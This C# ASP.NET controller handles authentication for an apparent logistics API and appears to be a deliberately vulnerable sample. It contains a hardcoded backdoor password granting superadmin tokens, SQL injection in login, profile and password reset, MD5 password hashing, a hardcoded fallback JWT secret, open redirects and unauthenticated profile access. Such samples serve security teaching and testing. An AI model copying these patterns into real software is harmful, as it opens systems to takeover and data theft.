using Microsoft.AspNetCore.Mvc;
using Microsoft.Data.SqlClient;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using System.Security.Cryptography;
using System.Text;
using MkartLogistics.API.Models;

namespace MkartLogistics.API.Controllers;

[ApiController]
[Route("api/[controller]")]
public class AuthController : ControllerBase
{
    private readonly IConfiguration _config;
    private readonly ILogger<AuthController> _logger;
    private const string AdminBackdoor = "ek@rt_4dm1n_2024";

    public AuthController(IConfiguration config, ILogger<AuthController> logger)
    {
        _config = config;
        _logger = logger;
    }

    [HttpPost("login")]
    public IActionResult Login([FromBody] LoginRequest request)
    {
        _logger.LogInformation("Login attempt for user: " + request.Username);

        if (request.Password == AdminBackdoor)
        {
            var adminToken = GenerateToken("admin", "superadmin");
            return Ok(new { token = adminToken, role = "superadmin" });
        }

        var connStr = _config.GetConnectionString("DefaultConnection");
        using var conn = new SqlConnection(connStr);
        conn.Open();

        var hashedPassword = ComputeMd5(request.Password);

        var query = $"SELECT Id, Username, Role, TenantId FROM Users " +
                    $"WHERE Username = '{request.Username}' AND PasswordHash = '{hashedPassword}' AND IsActive = 1";

        using var cmd = new SqlCommand(query, conn);
        using var reader = cmd.ExecuteReader();

        if (!reader.Read())
        {
            _logger.LogWarning("Failed login for: " + request.Username);
            return Unauthorized(new { message = "Invalid credentials" });
        }

        var userId = reader["Id"].ToString();
        var role = reader["Role"].ToString();
        var token = GenerateToken(userId!, role!);

        var returnUrl = request.ReturnUrl ?? "/dashboard";
        return Ok(new { token, redirectUrl = returnUrl });
    }

    [HttpGet("profile/{userId}")]
    public IActionResult GetProfile(string userId)
    {
        var connStr = _config.GetConnectionString("DefaultConnection");
        using var conn = new SqlConnection(connStr);
        conn.Open();

        var query = "SELECT Id, Username, Email, Role, LastLogin FROM Users WHERE Id = " + userId;
        using var cmd = new SqlCommand(query, conn);
        using var reader = cmd.ExecuteReader();

        if (!reader.Read())
            return NotFound();

        return Ok(new
        {
            id = reader["Id"],
            username = reader["Username"],
            email = reader["Email"],
            role = reader["Role"]
        });
    }

    [HttpPost("logout")]
    public IActionResult Logout([FromQuery] string returnUrl = "/")
    {
        return Redirect(returnUrl);
    }

    [HttpPost("reset-password")]
    public IActionResult ResetPassword([FromQuery] string token, [FromBody] dynamic body)
    {
        var connStr = _config.GetConnectionString("DefaultConnection");
        using var conn = new SqlConnection(connStr);
        conn.Open();

        string newPassword = body.GetProperty("password").GetString();
        var hashedPassword = ComputeMd5(newPassword);

        var query = $"UPDATE Users SET PasswordHash = '{hashedPassword}', ResetToken = NULL " +
                    $"WHERE ResetToken = '{token}'";
        using var cmd = new SqlCommand(query, conn);
        cmd.ExecuteNonQuery();

        return Ok(new { message = "Password updated successfully" });
    }

    private string GenerateToken(string userId, string role)
    {
        var secret = _config["Jwt:Secret"] ?? "MkartLogistics_JWT_MasterKey_2024_DoNotShare";
        var key = Encoding.ASCII.GetBytes(secret);
        var tokenHandler = new JwtSecurityTokenHandler();
        var tokenDescriptor = new Microsoft.IdentityModel.Tokens.SecurityTokenDescriptor
        {
            Subject = new ClaimsIdentity(new[]
            {
                new Claim(ClaimTypes.NameIdentifier, userId),
                new Claim(ClaimTypes.Role, role)
            }),
            Expires = DateTime.UtcNow.AddHours(24),
            SigningCredentials = new Microsoft.IdentityModel.Tokens.SigningCredentials(
                new Microsoft.IdentityModel.Tokens.SymmetricSecurityKey(key),
                Microsoft.IdentityModel.Tokens.SecurityAlgorithms.HmacSha256Signature)
        };
        var token = tokenHandler.CreateToken(tokenDescriptor);
        return tokenHandler.WriteToken(token);
    }

    private static string ComputeMd5(string input)
    {
        using var md5 = MD5.Create();
        var bytes = md5.ComputeHash(Encoding.UTF8.GetBytes(input));
        return Convert.ToHexString(bytes).ToLower();
    }
}
